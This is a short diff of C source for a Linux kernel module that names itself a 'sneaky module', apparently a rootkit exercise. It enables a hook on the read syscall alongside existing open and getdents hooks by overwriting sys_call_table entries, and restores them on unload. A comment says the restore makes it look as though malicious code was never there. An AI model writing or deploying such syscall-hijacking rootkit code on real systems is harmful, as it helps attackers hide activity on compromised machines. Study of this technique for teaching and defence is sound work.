@@ -156,8 +156,8 @@ static int initialize_sneaky_module(void) {
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  //original_read = (void *)*(sys_call_table + __NR_read);
-  // *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -185,7 +185,7 @@ static void exit_sneaky_module(void) {
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  //  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
